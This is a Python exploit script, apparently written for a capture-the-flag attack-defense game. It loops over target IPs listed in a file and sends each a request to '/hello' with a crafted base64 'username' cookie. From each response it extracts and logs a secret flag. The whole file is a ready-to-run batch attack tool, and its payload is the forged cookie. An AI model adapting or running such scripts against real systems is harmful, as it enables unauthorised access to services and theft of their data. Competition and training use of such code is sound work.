#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2020/9/17 15:16
# @Author  : Dawnnnnnn
# @Contact: 1050596704@qq.com
from framework.attack_framework import Session, Attack, Utils, logger
import re

target_file = "web1.txt"
attack = Attack(target_file)
session = Session()
utils = Utils()


def payload(ip):
    burp0_url = f"http://{ip}/hello"
    burp0_cookies = {"username": "OTg3NjU0MzIzNDU2Nzg5ODc2NTQveDM0MjM="}
    burp0_headers = {"Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Referer": "http://192.168.100.90:5000/", "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,ja;q=0.5",
                     "Connection": "close"}
    res = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    logger.info(res.text)
    flag = re.findall(r"\{.*\}", res.text)
    logger.info(f"{flag}")


attack.attack(func=payload)
